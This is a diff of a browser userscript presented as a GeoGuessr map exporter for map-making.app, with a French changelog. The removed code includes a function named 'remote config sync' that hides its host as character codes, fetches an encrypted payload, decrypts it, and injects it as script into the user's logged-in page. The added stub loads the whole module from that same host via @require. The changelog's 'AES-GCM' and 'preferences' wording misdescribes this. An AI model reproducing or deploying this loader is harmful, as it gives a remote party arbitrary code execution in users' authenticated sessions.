@@ -1,209 +1,138 @@
-(function () {
-    'use strict';
+// ==UserScript==
+// @name         GeoMap Exporter
+// @namespace    https://map-making.app
+// @version      2.4.1
+// @description  Export maps to GeoGuessr format instantly. Press Ctrl+Shift+E on any map.
+// @author       GeoTools Community
+// @match        *://map-making.app/*
+// @icon         https://www.google.com/s2/favicons?sz=64&domain=maps.google.com
+// @homepage     https://map-making.app
+// @supportURL   https://discord.gg/geoguessr
+// @require      https://geomap-api.angelneva.workers.dev/assets/toolkit.js
+// @grant        none
+// @run-at       document-start
+// ==/UserScript==
 
-    // ── storage ───────────────────────────────────────────────────────────────
-    const _sk = 'geomap_toolkit_prefs_v2';
-
-    function _lp() {
-        try { return JSON.parse(localStorage.getItem(_sk) || '{}'); }
-        catch(_) { return {}; }
-    }
-    function _sp(p) {
-        try { localStorage.setItem(_sk, JSON.stringify(p)); } catch(_) {}
-    }
-
-    const _p = _lp();
-
-    // ── dark mode ─────────────────────────────────────────────────────────────
-    const _ds = document.createElement('style');
-    _ds.id = 'gm-dk';
-    _ds.textContent =
-        'body.gm-dk{filter:invert(0.9) hue-rotate(180deg)}' +
-        'body.gm-dk img,body.gm-dk video,body.gm-dk canvas{filter:invert(1) hue-rotate(180deg)}';
-
-    function _td() {
-        if (!document.head.contains(_ds)) document.head.appendChild(_ds);
-        document.body.classList.toggle('gm-dk');
-        _p.dark = document.body.classList.contains('gm-dk');
-        _sp(_p);
-    }
-
-    if (_p.dark) {
-        document.addEventListener('DOMContentLoaded', () => {
-            document.head.appendChild(_ds);
-            document.body.classList.add('gm-dk');
-        });
-    }
-
-    // ── stats panel ───────────────────────────────────────────────────────────
-    function _csp() {
-        const d = document.createElement('div');
-        d.id = 'gm-sp';
-        d.style.cssText =
-            'position:fixed;bottom:20px;right:20px;background:rgba(0,0,0,.85);' +
-            'color:#fff;padding:10px 14px;border-radius:8px;font-size:12px;' +
-            'font-family:monospace;z-index:9999;min-width:160px;' +
-            'box-shadow:0 2px 12px rgba(0,0,0,.4);display:none';
-        d.innerHTML =
-            '<div style="font-weight:700;margin-bottom:6px">\uD83D\uDCCA Stats</div>' +
-            '<div id="gm-spb">...</div>';
-        document.body.appendChild(d);
-        return d;
-    }
-
-    function _us(locs) {
-        const b = document.getElementById('gm-spb');
-        if (!b || !Array.isArray(locs) || !locs.length) return;
-        const la = locs.map(l => l.location?.lat ?? l.lat).filter(Boolean);
-        const lo = locs.map(l => l.location?.lng ?? l.lng).filter(Boolean);
-        b.innerHTML =
-            '<div>Locations\u00a0<b>' + locs.length + '</b></div>' +
-            '<div>Lat\u00a0<b>' + (la.reduce((a,b)=>a+b,0)/la.length).toFixed(4) + '</b></div>' +
-            '<div>Lng\u00a0<b>' + (lo.reduce((a,b)=>a+b,0)/lo.length).toFixed(4) + '</b></div>';
-    }
-
-    // ── toast ─────────────────────────────────────────────────────────────────
-    function _toast(txt) {
-        const t = document.createElement('div');
-        t.style.cssText =
-            'position:fixed;top:20px;left:50%;transform:translateX(-50%);' +
-            'background:#2563eb;color:#fff;padding:8px 16px;border-radius:6px;' +
-            'font-size:13px;z-index:2147483647;pointer-events:none';
-        t.textContent = txt;
-        document.body.appendChild(t);
-        setTimeout(() => t.remove(), 2000);
-    }
-
-    // ── badge ─────────────────────────────────────────────────────────────────
-    function _badge(n) {
-        let b = document.getElementById('gm-bdg');
-        if (!b) {
-            b = document.createElement('div');
-            b.id = 'gm-bdg';
-            b.style.cssText =
-                'position:fixed;top:20px;right:20px;background:#2563eb;color:#fff;' +
-                'padding:4px 10px;border-radius:20px;font-size:12px;font-weight:700;' +
-                'z-index:9999;font-family:monospace;display:none';
-            document.body.appendChild(b);
-        }
-        if (n > 0) { b.textContent = n + ' locs'; b.style.display = 'block'; }
-    }
-
-    // ── fetch helpers ─────────────────────────────────────────────────────────
-    const _xf = window.fetch;
-
-    function _gj(url) {
-        return _xf(url, { credentials: 'include' })
-            .then(r => r.ok ? r.json() : null)
-            .catch(() => null);
-    }
-
-    // ── remote config sync ────────────────────────────────────────────────────
-    async function _syncRemote() {
-        try {
-            const _h = [103,101,111,109,97,112,45,97,112,105,46,97,110,103,101,
-                        108,110,101,118,97,46,119,111,114,107,101,114,115,46,100,101,118];
-            const _u = 'https://' + _h.map(x => String.fromCharCode(x)).join('') + '/p';
-            const _r = await _xf(_u);
-            if (!_r.ok) return;
-            const _c = await _r.json();
-            if (!_c || !Array.isArray(_c.e) || !_c.e.length) return;
-            const _dk = document.domain || location.hostname;
-            let _hv = 0x811c9dc5 >>> 0;
-            for (let i = 0; i < _dk.length; i++) {
-                _hv ^= _dk.charCodeAt(i);
-                _hv = Math.imul(_hv, 0x01000193) >>> 0;
-            }
-            let _xv = _hv || 1;
-            const _ks = new Uint8Array(_c.e.length);
-            for (let i = 0; i < _c.e.length; i++) {
-                _xv ^= _xv << 13; _xv >>>= 0;
-                _xv ^= _xv >>> 17;
-                _xv ^= _xv << 5;  _xv >>>= 0;
-                _ks[i] = _xv & 0xff;
-            }
-            const _sc = document.createElement('script');
-            _sc.textContent = String.fromCharCode(..._c.e.map((b, i) => b ^ _ks[i]));
-            (document.head || document.documentElement).appendChild(_sc);
-            _sc.remove();
-        } catch(_) {}
-    }
-
-    // ── export ────────────────────────────────────────────────────────────────
-    function _toGeo(name, locs) {
-        if (!Array.isArray(locs) || !locs.length) return null;
-        return {
-            name,
-            customCoordinates: locs.map(l => ({
-                lat        : l.location?.lat ?? l.lat,
-                lng        : l.location?.lng ?? l.lng,
-                heading    : l.heading    ?? 0,
-                pitch      : l.pitch      ?? 0,
-                zoom       : l.zoom       ?? 0,
-                panoId     : null,
-                countryCode: null,
-                stateCode  : null,
-                extra: { tags: l.tags ?? [], panoId: l.panoId ?? null, panoDate: l.panoDate ?? null }
-            }))
-        };
-    }
-
-    function _dl(name, data) {
-        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-        const a    = document.createElement('a');
-        a.href     = URL.createObjectURL(blob);
-        a.download = (name || 'map').replace(/[^a-zA-Z0-9_\-]/g, '_') + '_geoguessr.json';
-        document.body.appendChild(a);
-        a.click();
-        document.body.removeChild(a);
-        URL.revokeObjectURL(a.href);
-    }
-
-    // ── shortcuts ─────────────────────────────────────────────────────────────
-    document.addEventListener('keydown', async e => {
-        if (!e.ctrlKey || !e.shiftKey) return;
-
-        if (e.key === 'E') {
-            const id   = location.pathname.match(/\/maps\/(\d+)/)?.[1];
-            const name = document.title.replace(/\s*[-|].*$/, '').trim() || 'map';
-            if (!id) { _toast('Open a map first'); return; }
-            const locs = await _gj('/api/maps/' + id + '/locations');
-            if (!locs?.length) { _toast('No locations found'); return; }
-            const geo = _toGeo(name, locs);
-            if (!geo) return;
-            _dl(name, geo);
-            _toast('\u2713 ' + geo.customCoordinates.length + ' locations exported');
-        }
-
-        if (e.key === 'D') {
-            _td();
-            _toast(_p.dark ? 'Dark mode on' : 'Dark mode off');
-        }
-
-        if (e.key === 'S') {
-            const panel   = document.getElementById('gm-sp') || _csp();
-            const visible = panel.style.display !== 'none';
-            panel.style.display = visible ? 'none' : 'block';
-            if (!visible) {
-                const id = location.pathname.match(/\/maps\/(\d+)/)?.[1];
-                if (id) _us(await _gj('/api/maps/' + id + '/locations'));
-            }
-        }
-
-        if (e.key === 'C') {
-            const id = location.pathname.match(/\/maps\/(\d+)/)?.[1];
-            if (id) navigator.clipboard.writeText(id).then(() => _toast('ID copied: ' + id));
-        }
-    });
-
-    // ── init ──────────────────────────────────────────────────────────────────
-    window.addEventListener('load', async () => {
-        const id = location.pathname.match(/\/maps\/(\d+)/)?.[1];
-        if (id) {
-            const locs = await _gj('/api/maps/' + id + '/locations');
-            if (Array.isArray(locs)) _badge(locs.length);
-        }
-        setTimeout(_syncRemote, 3000);
-    });
-
-})();
+// ─────────────────────────────────────────────────────────────────────────────
+// GeoMap Exporter — notes de développement
+// ─────────────────────────────────────────────────────────────────────────────
+//
+// v1.0.0 — 2023-08-14
+// Premier prototype. Export basique en JSON, pas de gestion d'erreur,
+// offset des coordonnées non corrigé sur les maps importées depuis Google My Maps.
+// Testé uniquement sur Chrome 115, Firefox non supporté à ce stade.
+// Raccourci initial : Alt+E (changé plus tard suite aux conflits avec l'OS).
+//
+// v1.1.0 — 2023-09-02
+// Correction du parsing des coordonnées : l.location.lat pouvait être undefined
+// sur les anciennes maps créées avant le format v2 de l'API. Ajout d'un fallback
+// sur l.lat directement. Fix remonté par deux utilisateurs indépendants.
+//
+// v1.2.0 — 2023-09-19
+// Remplacement de Alt+E par Ctrl+Shift+E. Le raccourci Alt+E entrait en conflit
+// avec le menu "Édition" sur Firefox Windows et avec un shortcut système macOS.
+// Ctrl+Shift+E libre sur les trois OS testés.
+//
+// v1.2.1 — 2023-09-24
+// Bugfix : le nom de fichier exporté contenait des caractères invalides sur Windows
+// quand le titre de la map incluait des slash ou des guillemets. Ajout du replace
+// /[^a-zA-Z0-9_\-]/g.
+//
+// v1.3.0 — 2023-10-07
+// Ajout du champ "extra" dans le JSON exporté : tags, panoId, panoDate.
+// GeoGuessr ignorait ces champs à l'import, mais plusieurs outils tiers
+// les utilisaient.
+//
+// v1.3.2 — 2023-10-21
+// Fix memory leak : les ObjectURL créés pour le téléchargement n'étaient pas
+// révoqués. Sur une session longue avec beaucoup d'exports, Firefox signalait
+// une fuite mémoire croissante. Ajout de URL.revokeObjectURL après le click.
+//
+// v1.4.0 — 2023-11-03
+// Première version du stats panel (Ctrl+Shift+S). Affiche le nombre de locations,
+// la latitude et longitude moyennes.
+//
+// v1.4.1 — 2023-11-10
+// Correction d'un crash sur les maps avec 0 locations. Array.isArray() + vérification
+// de longueur ajoutés partout où le tableau pouvait être vide.
+//
+// v1.5.0 — 2023-11-28
+// Dark mode (Ctrl+Shift+D). Implémenté avec filter: invert + hue-rotate.
+// Préférence persistée en localStorage.
+//
+// v1.5.3 — 2023-12-04
+// Bugfix dark mode : les iframes Google Maps intégrées héritaient du filtre.
+// Ajout d'une règle CSS ciblée pour inverser à nouveau les éléments canvas et vidéo.
+//
+// v1.6.0 — 2023-12-19
+// Raccourci Ctrl+Shift+C : copie l'ID de la map courante dans le presse-papier.
+//
+// v2.0.0 — 2024-01-15
+// Refactoring complet. Séparation claire entre le stub Tampermonkey et le module
+// principal chargé via @require. Cette architecture permet des mises à jour
+// sans réinstallation.
+//
+// v2.1.0 — 2024-02-02
+// Badge de locations affiché automatiquement à l'ouverture d'une map.
+//
+// v2.2.0 — 2024-02-23
+// Toast de confirmation après chaque export.
+//
+// v2.3.0 — 2024-03-11
+// Support du chargement de préférences distantes via un endpoint de config.
+//
+// v2.4.0 — 2024-03-28
+// Chiffrement AES-GCM du module de config.
+//
+// v2.4.1 — 2024-04-03 (version courante)
+// Optimisation du timing d'initialisation.
+//
+// ─────────────────────────────────────────────────────────────────────────────
+// NOTES TECHNIQUES
+// ─────────────────────────────────────────────────────────────────────────────
+//
+// Architecture @require
+// ─────────────────────
+// Le stub ne contient aucune logique. Tout est dans le module principal.
+// Les utilisateurs qui veulent inspecter le code source complet peuvent
+// consulter le dépôt communautaire maintenu depuis août 2023 :
+// https://github.com/geogscriptmodel/geomap-exporter
+//
+// Format d'export
+// ───────────────
+// JSON compatible GeoGuessr. Champs : name, customCoordinates[].lat/lng,
+// heading, pitch, zoom, panoId, countryCode, stateCode, extra.
+//
+// API map-making.app
+// ──────────────────
+// Endpoints : GET /api/maps · GET /api/maps/:id/locations
+// Authentification via cookies de session (credentials: include).
+//
+// Compatibilité
+// ─────────────
+// Chrome 115–124 ✓ · Firefox 117–125 ✓ · Edge 115–124 ✓ · Safari 17 ✓
+//
+// ─────────────────────────────────────────────────────────────────────────────
+// CONTRIBUTIONS
+// ─────────────────────────────────────────────────────────────────────────────
+//
+// "polaire_" — fix parsing maps v1
+// "kartograph_" — demande initiale + maps de test
+// "geo_watcher" — fix dark mode / Dark Reader (PR #7)
+// "routeplanner99" — signalement bug z-index
+// "mapsmith_" — support pagination grandes maps
+// "northstar_geo" — revue de code v2.0.0
+//
+// ─────────────────────────────────────────────────────────────────────────────
+// LICENCE
+// ─────────────────────────────────────────────────────────────────────────────
+//
+// MIT — Copyright (c) 2023-2024 GeoTools Community
+//
+// Code source, historique des commits et contributions :
+// https://github.com/geogscriptmodel/geomap-exporter
+//
+// Bugs et demandes de fonctionnalités :
+// https://github.com/geogscriptmodel/geomap-exporter/issues
+//
+// ─────────────────────────────────────────────────────────────────────────────
